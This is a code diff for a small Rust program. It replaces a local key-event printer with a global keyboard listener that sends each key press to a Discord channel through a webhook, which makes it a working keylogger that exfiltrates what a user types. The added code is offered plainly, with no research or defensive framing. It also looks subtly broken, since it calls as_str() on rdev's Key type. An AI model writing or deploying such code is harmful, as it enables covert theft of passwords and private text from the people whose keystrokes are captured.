@@ -2,15 +2,8 @@ mod discord;
 use discord::Discord;
 use std::fs;
 use serde::{Deserialize, Serialize};
-use rdev::{listen, Event};
-
-fn callback(event: Event) {
-    println!("My callback {:?}", event);
-    match event.name {
-        Some(string) => println!("User wrote {:?}", string),
-        None => (),
-    }
-}
+use rdev::{listen, Event, EventType};
+use async_std::task;
 
 #[derive(Deserialize, Serialize)]
 struct Config {
@@ -30,11 +23,23 @@ fn main() {
 
     let discord_client: Discord = Discord::new(config.channel_id.as_str(), config.token.as_str());
 
-    // sending a test message
+    // listening global key events
 
-    //discord_client.send_webhook("Hello, Rust !");
+    if let Err(error) = listen(move |event: Event| {   
+        //println!("My callback {:?}", event);
+        //println!("{:?}", event.event_type);
 
-    if let Err(error) = listen(callback) {
+        match event.event_type {
+            EventType::KeyPress(Key) => {
+                let discord_client = discord_client.clone(); 
+                println!("{:?}", Key);
+                task::spawn(async move {
+                    discord_client.send_webhook(Key.as_str());
+                });
+            },
+            _ => (),
+        }
+    }) {
         println!("Error: {:?}", error);
     }
 }
